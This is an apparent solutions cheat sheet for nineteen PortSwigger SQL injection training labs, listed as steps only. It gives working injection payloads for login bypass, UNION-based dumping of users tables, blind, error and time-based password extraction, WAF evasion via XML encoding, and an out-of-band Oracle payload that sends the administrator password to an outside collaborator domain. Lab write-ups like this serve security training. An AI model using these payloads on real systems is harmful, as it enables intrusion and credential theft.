---
title: PortSwigger SQL Injection Labs — Steps Only
---

# 1. WHERE clause — retrieve hidden data
1. Go to a category filter URL: `/filter?category=Gifts`.
2. In Repeater, set `category=Gifts'` → confirm 500 error.
3. Set `category=Gifts' OR 1=1--`.
4. Send. Solved.

# 2. Login bypass
1. Capture login POST request, send to Repeater.
2. Set `username=administrator'--`.
3. Set `password=anything`.
4. Send. Solved.

# 3. UNION — determine column count
1. `category=Gifts' ORDER BY 1--`, increment until error. Last working number = column count.
   OR
2. `category=Gifts' UNION SELECT NULL--`, add more `NULL`s until no error.

# 4. UNION — find text column
1. Determine column count (Lab 3).
2. `' UNION SELECT 'a',NULL,NULL--`
3. Move `'a'` to each position until no error and `'a'` appears on page.

# 5. UNION — data from other tables
1. Determine column count + text column (Labs 3–4).
2. `' UNION SELECT username, password FROM users--`
3. Send, find administrator's password in response.
4. Log in as administrator. Solved.

# 6. UNION — multiple values in one column
1. Confirm only 1 usable column.
2. `' UNION SELECT username || '~' || password FROM users--`
   (MySQL: `CONCAT(username,'~',password)`; MSSQL: `username + '~' + password`)
3. Log in as administrator. Solved.

# 7. DB version — Oracle
1. `' UNION SELECT NULL FROM DUAL--` to get column count.
2. `' UNION SELECT banner FROM v$version--`
3. Send. Solved.

# 8. DB version — MySQL/MSSQL
1. Determine column count.
2. `' UNION SELECT @@version--`
3. Send. Solved.

# 9. List DB contents — non-Oracle
1. `' UNION SELECT table_name, NULL FROM information_schema.tables--`
2. Find credentials-looking table name.
3. `' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='<table>'--`
4. `' UNION SELECT <user_col>, <pass_col> FROM <table>--`
5. Log in as administrator. Solved.

# 10. List DB contents — Oracle
1. `' UNION SELECT table_name, NULL FROM all_tables--`
2. `' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name='<table>'--`
3. `' UNION SELECT <user_col>, <pass_col> FROM <table>--`
4. Log in as administrator. Solved.

# 11. Blind — conditional responses
1. Find `TrackingId` cookie, send to Repeater.
2. `TrackingId=x' AND '1'='1` vs `x' AND '1'='2` → confirm page difference.
3. `x' AND (SELECT 'a' FROM users WHERE username='administrator')='a`
4. `x' AND (SELECT LENGTH(password) FROM users WHERE username='administrator')>N` — binary search length.
5. `x' AND (SELECT SUBSTRING(password,N,1) FROM users WHERE username='administrator')>'m'` — binary search / Intruder each character.
6. Log in as administrator. Solved.

# 12. Blind — conditional errors
1. Find `TrackingId` cookie injection point.
2. `x' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 1 END)=1--` → 500.
3. `x' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 1 END)=1--` → 200.
4. `x' AND (SELECT CASE WHEN (SUBSTRING(password,N,1)='c') THEN 1/0 ELSE 1 END FROM users WHERE username='administrator')=1--` — iterate with Intruder, use status code as signal.
5. Log in as administrator. Solved.

# 13. Visible error-based
1. Find injection point, confirm raw DB error is echoed.
2. `' AND 1=CAST((SELECT password FROM users WHERE username='administrator') AS int)--`
3. Read password from the error message text.
4. Log in as administrator. Solved.

# 14. Time delays
1. Find `TrackingId` cookie injection point.
2. `' AND SLEEP(10)--` (or `pg_sleep(10)` / `WAITFOR DELAY '0:0:10'`).
3. Send, confirm ~10s response delay. Solved.

# 15. Time delays + info retrieval
1. Confirm time-based oracle (Lab 14).
2. `' AND (SELECT CASE WHEN (SUBSTRING(password,N,1)='c') THEN SLEEP(5) ELSE 0 END FROM users WHERE username='administrator')--`
3. Use Intruder, sort by response time, iterate each character position.
4. Log in as administrator. Solved.

# 16. Out-of-band interaction
1. Open Burp Collaborator client, copy payload domain.
2. `' AND (SELECT UTL_HTTP.REQUEST('http://<collaborator-id>.oastify.com/') FROM dual) IS NOT NULL--`
3. Send, click "Poll now" in Collaborator client. Solved on interaction received.

# 17. Out-of-band data exfiltration
1. Get Collaborator payload domain.
2. `' AND (SELECT UTL_HTTP.REQUEST('http://' || (SELECT password FROM users WHERE username='administrator') || '.<collaborator-id>.oastify.com/') FROM dual) IS NOT NULL--`
3. Send, "Poll now" in Collaborator client.
4. Read password from the incoming DNS/HTTP request subdomain.
5. Log in as administrator. Solved.

# 18. Second-order SQL injection
1. Register account with username: `administrator'--` and any password.
2. Log in with that account.
3. Go to "change password" / account update feature and submit a new password.
4. Log out.
5. Log in as `administrator` with the new password you set. Solved.

# 19. Filter bypass via XML encoding
1. Find XML-body request (e.g. `storeId` field), confirm WAF blocks raw SQLi payload.
2. Build payload: `' UNION SELECT username || '~' || password FROM users--`
3. Select it in Repeater, right-click → Convert selection → XML encode (all characters).
4. Paste XML-encoded payload into the field.
5. Send. Solved.
